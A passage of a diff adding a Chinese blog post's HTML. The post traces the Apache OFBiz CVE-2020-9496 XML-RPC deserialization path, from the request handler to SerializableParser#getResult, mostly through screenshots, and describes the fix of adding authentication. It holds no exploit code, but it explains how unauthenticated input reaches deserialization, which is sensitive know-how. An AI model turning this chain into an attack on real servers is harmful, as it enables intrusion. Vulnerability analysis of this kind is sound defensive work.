+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154604745.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154604745.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154604745.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154604745.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154604745.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154604745.png" /></p>
+<p>然后跟进这个 doget 方法，在这里 <code>requestHandler.doRequest</code> 继续跟进，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163340964.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163340964.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163340964.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163340964.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163340964.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163340964.png" /></p>
+<p>controllerConfig 根据 controller.xml 配置文件来获取 url 信息，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163828814.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163828814.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163828814.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163828814.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163828814.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508163828814.png" /></p>
+<p>默认有 216 个，不同路由对应不同的类。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164145844.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164145844.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164145844.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164145844.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164145844.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164145844.png" /></p>
+<p>然后接着会从 <code>requestMapMap</code> 中获得我们请求路由 xmlrpc 对应的处理类，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164659777.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164659777.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164659777.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164659777.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164659777.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508164659777.png" /></p>
+<p>然后来到这里，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165007396.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165007396.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165007396.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165007396.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165007396.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165007396.png" /></p>
+<p>跟进这个 runEvent 方法，就是根据 <code>requestMap.event</code> 信息去查找负责处理event的handler，然后通过 invoke 进行具体调用，连续循环几次就会到我们的 xmlrpc，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165451686.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165451686.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165451686.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165451686.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165451686.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165451686.png" /></p>
+<p>跟进 invoke 方法，没有传入 echo 参数，进入 else 条件，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165601765.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165601765.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165601765.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165601765.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165601765.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165601765.png" /></p>
+<p>然后继续跟进下下面这个 execute 方法，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165645053.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165645053.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165645053.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165645053.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165645053.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165645053.png" /></p>
+<p>调用 getRequest 对请求内容进行处理，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165952484.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165952484.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165952484.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165952484.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165952484.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508165952484.png" /></p>
+<p>跟进该方法，直接调用了 SAXParsers.newXMLReader.parse 解析我们的输入流，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508170111007.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508170111007.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508170111007.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508170111007.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508170111007.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508170111007.png" /></p>
+<p>需要添加xmlrpc-common-3.1.3.jar 依赖包，经过一系列重载的 parse 方法调用，最后来到 startElement 方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174045060.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174045060.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174045060.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174045060.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174045060.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174045060.png" /></p>
+<p>会调用其父类的 startElement 方法，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174300945.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174300945.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174300945.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174300945.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174300945.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174300945.png" /></p>
+<p>对pURI进行了判断，这也是为什么我们的payload要设置<code>xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174419766.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174419766.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174419766.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174419766.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174419766.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174419766.png" /></p>
+<p>接着会调用ByteArrayParser的startElement进行一个base64解码</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174809796.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174809796.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174809796.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174809796.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174809796.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174809796.png" /></p>
+<p>最后又是一通调用，最后来到 <code>SerializableParser#getResult</code> 方法进行反序列化，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174953843.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174953843.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174953843.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174953843.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174953843.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508174953843.png" /></p>
+<hr>
+<h2 id="漏洞修复">漏洞修复</h2>
+<p>增加了鉴权，让这个功能点不能未授权访问。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508175212333.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508175212333.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508175212333.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508175212333.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508175212333.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508175212333.png" /></p>
+<p>参考：<a href="https://ilikeoyt.github.io/2024/09/10/Apache-OfBiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-9496%EF%BC%89/#more" target="_blank" rel="noopener noreffer ">https://ilikeoyt.github.io/2024/09/10/Apache-OfBiz-反序列化命令执行漏洞-分析（CVE-2020-9496）/#more</a></p>
+<p>参考：<a href="https://xz.aliyun.com/news/7919" target="_blank" rel="noopener noreffer ">https://xz.aliyun.com/news/7919</a>，这篇文章分析得非常全面。</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2025-04-06</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/apacheofbiz/" data-title="Apache OfBiz 反序列化命令（CVE-2020-9496）" data-hashtags="java"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/apacheofbiz/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/jndi-ldap/" class="prev" rel="prev" title="JNDI 之 LDAP 过程原理"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>JNDI 之 LDAP 过程原理</a>
+            <a href="/posts/%E5%8D%8E%E5%A4%8Fcms/" class="next" rel="next" title="华夏 ERP CMS v2.3代码审计">华夏 ERP CMS v2.3代码审计<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.140.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">gaorenyusi</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.zh.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+</html>
